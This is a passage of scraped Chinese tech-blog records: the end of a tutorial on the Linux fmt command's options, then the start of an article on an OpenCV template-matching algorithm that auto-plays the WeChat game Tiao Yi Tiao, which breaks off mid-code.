data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6361c755965924319186-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6361c755965924319186-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6361c755965924319186-1\"><span class=\"crayon-i\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6361c755965924319186-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>下面截屏是命令的执行结果：</p>\n<p><a href=\"https://www.howtoforge.com/images/linux_fmt_command/big/fmt-basic-usage.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/435b2ea3a3a986139f36c1d3ba19f5db.png\" alt=\"format contents of file in single line\"></a></p>\n<p>你可以看到文件中多行内容都被格式化成同一行了。请注意，这并不会修改原文件（file1）。</p>\n<h3 id=\"toc_3\">Q2、如何修改最大行宽？</h3>\n<p>默认情况下，<code>fmt</code> 命令产生的输出中的最大行宽为 75。然而，如果你想的话，可以用 <code>-w</code> 选项进行修改，它接受一个表示新行宽的数字作为参数值。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6361c755969080669526\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt -w [n] [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6361c755969080669526-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6361c755969080669526-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6361c755969080669526-1\"><span class=\"crayon-v\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6361c755969080669526-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>下面这个例子把行宽削减到了 20：</p>\n<p><a href=\"https://www.howtoforge.com/images/linux_fmt_command/big/fmt-w-option.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/d104ae214b626206e10c813ff6da7dd2.png\" alt=\"change maximum line width\"></a></p>\n<h3 id=\"toc_4\">Q3、如何让 fmt 突出显示第一行？</h3>\n<p>这是通过让第一行的缩进与众不同来实现的，你可以使用 <code>-t</code> 选项来实现。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6361c75596d877213559\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt -t [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6361c75596d877213559-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6361c75596d877213559-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6361c75596d877213559-1\"><span class=\"crayon-v\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6361c75596d877213559-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><a href=\"https://www.howtoforge.com/images/linux_fmt_command/big/fmt-t-option.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/20eefe77b7ac2caa4e2d1868d5ee9548.png\" alt=\"make fmt highlight the first line\"></a></p>\n<h3 id=\"toc_5\">Q4、如何使用 fmt 拆分长行？</h3>\n<p>fmt 命令也能用来对长行进行拆分，你可以使用 <code>-s</code> 选项来应用该功能。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6361c755971056162852\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt -s [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6361c755971056162852-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6361c755971056162852-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6361c755971056162852-1\"><span class=\"crayon-v\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6361c755971056162852-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>下面是一个例子：</p>\n<p><a href=\"https://www.howtoforge.com/images/linux_fmt_command/big/fmt-s-option.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b5087c0f6ec116a53f90d84902fe07cd.png\" alt=\"make fmt split long lines\"></a></p>\n<h3 id=\"toc_6\">Q5、如何在单词与单词之间，句子之间用空格分开？</h3>\n<p>fmt 命令提供了一个 <code>-u</code> 选项，这会在单词与单词之间用单个空格分开，句子之间用两个空格分开。你可以这样用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6361c755975656992341\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt -u [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6361c755975656992341-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6361c755975656992341-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6361c755975656992341-1\"><span class=\"crayon-v\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6361c755975656992341-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>注意，在我们的案例中，这个功能是默认开启的。</p>\n<h3 id=\"toc_7\">总结</h3>\n<p>没错，<code>fmt</code> 提供的功能不多，但不代表它的应用就不广泛。因为你永远不知道什么时候会用到它。在本教程中，我们已经讲解了 <code>fmt</code> 提供的主要选项。若想了解更多细节，请查看该工具的 <a href=\"https://linux.die.net/man/1/fmt\">man 页</a>。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113479\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113479votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113479\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"url_object_id": "9f93ee8d23796b520f6499f5d14f230d", "title": "AI 玩跳一跳的正确姿势，跳一跳 Auto-Jump 算法详解", "url": "http://blog.jobbole.com/113493/", "create_date": "2018/01/16", "front_img_url": ["http://wx1.sinaimg.cn/mw690/63918611gy1fnig1hdnpdj20gx0c2wez.jpg"], "praise_nums": 2, "comment_nums": 3, "favor_nums": 1, "tags": "IT技术,小游戏,跳一跳", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32636329\">肖泰洪 + 安捷</a>   </div><p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnig1hdnpdj20gx0c2wez.jpg\" width=\"609\" height=\"434\"></p>\n<p>最近，微信小游戏跳一跳可以说是火遍了全国，从小孩子到大孩子仿佛每一个人都在刷跳一跳，作为无（zhi）所（hui）不（ban）能（zhuan）的AI程序员，我们在想，能不能用人工智能（AI）和计算机视觉（CV）的方法来玩一玩这个游戏？于是，我们开发了微信跳一跳Auto-Jump算法，重新定义了玩跳一跳的正确姿势，我们的算法不仅远远超越了人类的水平，在速度和准确度上也远远超越了目前已知的所有算法，可以说是跳一跳界的state-of-the-art，下面我们详细介绍我们的算法。</p>\n<p>算法的第一步是获取手机屏幕的截图并可以控制手机的触控操作，我们的<a href=\"https://github.com/Prinsphield/Wechat_AutoJump\">github仓库</a>里详细介绍了针对Android和IOS手机的配置方法。</p>\n<p>你只需要按照将手机连接电脑，按照教程执行就可以完成配置。在获取到屏幕截图之后，就是个简单的视觉问题。我们需要找的就是小人的位置和下一次需要跳的台面的中心。</p>\n<p>如图所示，绿色的点代表小人当前的位置，红点代表目标位置。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnig1hqbj2j20k00hoglp.jpg\" width=\"690\" height=\"610\"></p>\n<h2>多尺度搜索（Multiscale Search）</h2>\n<p>这个问题可以有非常多的方法去解，为了糙快猛地刷上榜，我一开始用的方式是多尺度搜索。我随便找了一张图，把小人抠出来，就像下面这样。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnig1j5ysoj201e03wdfl.jpg\" width=\"50\" height=\"140\"></p>\n<p>另外，我注意到小人在屏幕的不同位置，大小略有不同，所以我设计了多尺度的搜索，用不同大小的进行匹配，最后选取置信度（confidence score）最高的。</p>\n<p>多尺度搜索的代码长这样</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abe0cd3e290267293\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef multi_scale_search(pivot, screen, range=0.3, num=10):\r\n    H, W = screen.shape[:2]\r\n    h, w = pivot.shape[:2]\r\n\r\n    found = None\r\n    for scale in np.linspace(1-range, 1+range, num)[::-1]:\r\n        resized = cv2.resize(screen, (int(W * scale), int(H * scale)))\r\n        r = W / float(resized.shape[1])\r\n        if resized.shape[0] &lt; h or resized.shape[1] &lt; w:\r\n            break\r\n        res = cv2.matchTemplate(resized, pivot, cv2.TM_CCOEFF_NORMED)\r\n\r\n        loc = np.where(res &gt;= res.max())\r\n        pos_h, pos_w = list(zip(*loc))[0]\r\n\r\n        if found is None or res.max() &gt; found[-1]:\r\n            found = (pos_h, pos_w, r, res.max())\r\n\r\n    if found is None: return (0,0,0,0,0)\r\n    pos_h, pos_w, r, score = found\r\n    start_h, start_w = int(pos_h * r), int(pos_w * r)\r\n    end_h, end_w = int((pos_h + h) * r), int((pos_w + w) * r)\r\n    return [start_h, start_w, end_h, end_w, score]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd3e290267293-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd3e290267293-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">multi_scale_search</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pivot</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">screen</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">range</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">num</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">H</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">W</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">screen</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">found</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-6\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">scale </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">linspace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">range</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">range</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">num</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">::</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">resized</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cv2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">resize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">screen</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">W *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">scale</span><span 